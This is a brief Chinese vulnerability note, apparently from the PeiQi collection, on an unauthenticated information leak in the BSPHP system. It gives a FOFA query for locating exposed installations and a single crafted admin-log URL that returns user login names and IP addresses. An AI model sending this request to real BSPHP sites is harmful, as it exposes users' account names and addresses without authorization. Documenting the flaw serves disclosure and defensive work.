---
title: BSPHP 未授权访问 信息泄露漏洞
date: 2021-09-23 23:55:51
tags: PeiQi文库
categories:
 - CMS漏洞
 - BSPHP
---

# BSPHP 未授权访问 信息泄露漏洞

## 漏洞描述

BSPHP 存在未授权访问 泄露用户 IP 和 账户名信息

## 漏洞影响

> [!NOTE]
>
> BSPHP

## FOFA

> [!NOTE]
>
> "BSPHP"

## 漏洞复现

访问如下URL，泄露用户名与登录IP

```
http://xxx.xxx.xxx.xxx/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&bsphptime=1600407394176&soso_id=1&soso=&DESC=0‘
```

![bsphp-1](/img/20210924020225011732.png)

